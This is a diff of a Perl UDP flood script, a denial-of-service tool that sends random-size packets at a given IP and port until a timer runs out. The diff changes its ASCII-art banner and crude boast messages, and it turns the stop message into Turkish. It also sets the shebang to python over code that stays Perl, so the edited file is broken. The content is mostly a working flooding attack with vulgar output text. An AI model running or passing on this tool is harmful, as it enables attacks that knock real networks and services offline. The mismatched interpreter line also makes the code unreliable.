@@ -1,4 +1,4 @@
-#!/usr/bin/perl
+#!/usr/bin/python
 
 use Term::ANSIColor qw(:constants);
     $Term::ANSIColor::AUTORESET = 2;
@@ -19,30 +19,25 @@ $endtime = time() + ($time ? $time : 100);
 socket(flood, PF_INET, SOCK_DGRAM, 17);
 
 print BOLD RED<<EOTEXT;
-
-MMMMMMMMMMMMMMMMMMMMM                              MMMMMMMMMMMMMMMMMMMMM
- `MMMMMMMMMMMMMMMMMMMM           N    N           MMMMMMMMMMMMMMMMMMMM'
-   `MMMMMMMMMMMMMMMMMMM          MMMMMM          MMMMMMMMMMMMMMMMMMM'  
-     MMMMMMMMMMMMMMMMMMM-_______MMMMMMMM_______-MMMMMMMMMMMMMMMMMMM    
-      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    
-      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    
-      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    
-     .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.    
-    MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
-                   `MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM'                
-                          `MMMMMMMMMMMMMMMMMM'                    
-                              `MMMMMMMMMM'                              
-                                 MMMMMM                         
-                                  MMMM                                  
-                                   MM                                  
-
-
+                   ,,,, 
+             ,;) .';;;;',
+ ;;,,_,-.-.,;;'_,|I\;;;/),,_
+  `';;/:|:);{ ;;;|| \;/ /;;;\__
+      L;/-';/ \;;\',/;\/;;;.') \
+      .:`''` - \;;'.__/;;;/  . _'-._ 
+    .'/   \     \;;;;;;/.'_7:.  '). \_
+  .''/     | '._ );}{;//.'    '-:  '.,L
+.'. /       \  ( |;;;/_/         \._./;\   _,
+ . /        |\ ( /;;/_/             ';;;\,;;_,
+. /         )__(/;;/_/                (;;'''''
+ /        _;:':;;;;:';-._             );
+/        /   \  `'`   --.'-._         \/
 EOTEXT
 
 print "MemeCFW and The Bat Dropped Yo Shit $ip " . ($port ? $port : "Sucking The Clit") . " With " . 
-  ($size ? "$size-Slammed" : "65500") . "Bots" . 
+  ($size ? "$size-Slammed" : "65500") . "Bot" . 
   ($time ? " for $time seconds" : "") . "\n";
-print "Stop NULLING With Ctrl-C\n" unless $time;
+print "Durdurmak için ctrl+c\n" unless $time;
  
 for (;time() <= $endtime;) {
   $psize = $size ? $size : int(rand(1024-64)+64) ;
